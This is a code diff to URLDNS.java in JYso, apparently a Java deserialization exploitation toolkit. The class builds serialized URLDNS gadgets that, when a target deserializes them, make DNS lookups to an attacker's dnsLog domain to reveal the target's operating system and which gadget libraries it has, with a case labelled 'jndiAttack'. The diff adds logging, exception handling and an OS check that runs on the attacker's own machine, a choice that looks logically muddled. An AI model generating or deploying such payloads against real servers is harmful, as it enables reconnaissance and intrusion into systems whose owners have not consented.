@@ -2,6 +2,8 @@ package com.qi4l.JYso.gadgets;
 
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 import java.lang.reflect.Field;
 import java.net.URL;
@@ -38,6 +40,7 @@ import java.util.List;
 @Dependencies()
 @Authors({Authors.GEBL})
 public class URLDNS implements ObjectPayload<Object> {
+    private static final Logger log = LogManager.getLogger(URLDNS.class);
     public static String[] defaultClass = new String[]{
             "CommonsCollections13567",
             "CommonsCollections24",
@@ -534,19 +537,30 @@ public class URLDNS implements ObjectPayload<Object> {
                 break;
             case "winlinux":
                 //windows/linux版本判断
-                Object linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
-                Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
-                Object linux1 = getURLDNSGadget("linux." + dnsLog, "java.io.UnixFileSystem");
-                Object windows1 = getURLDNSGadget("windows." + dnsLog, "java.io.WinNTFileSystem");
-                list.add(linux);
-                list.add(windows);
-                list.add(linux1);
-                list.add(windows1);
+
+                String os = System.getProperty("os.name").toLowerCase();
+                String fsClass;
+
+                if (os.contains("win")) {
+                    Object linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
+                    Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
+                    list.add(linux);
+                    list.add(windows);
+                } else {
+                    Object linux1 = getURLDNSGadget("linux1." + dnsLog, "java.io.UnixFileSystem");
+                    Object windows1 = getURLDNSGadget("windows1." + dnsLog, "java.io.WinNTFileSystem");
+                    list.add(linux1);
+                    list.add(windows1);
+                }
                 break;
 
             case "all":
-                for (String aClass : defaultClass) {
-                    setList(aClass, dnsLog);
+                try {
+                    for (String aClass : defaultClass) {
+                        setList(aClass, dnsLog);
+                    }
+                } catch (Exception e) {
+                    log.error("e: ", e);
                 }
                 break;
             default:
@@ -583,7 +597,6 @@ public class URLDNS implements ObjectPayload<Object> {
             case "db":
                 setList("db", url);
                 break;
-            // all 会测试全部类
             case "jndiAttack":
                 setList("jndiAttack", url);
                 break;
@@ -602,7 +615,6 @@ public class URLDNS implements ObjectPayload<Object> {
 
             case "null":
                 return getURLDNSGadget(url, null);
-            // 默认指定类
             default:
                 setList(tYPE, url);
         }
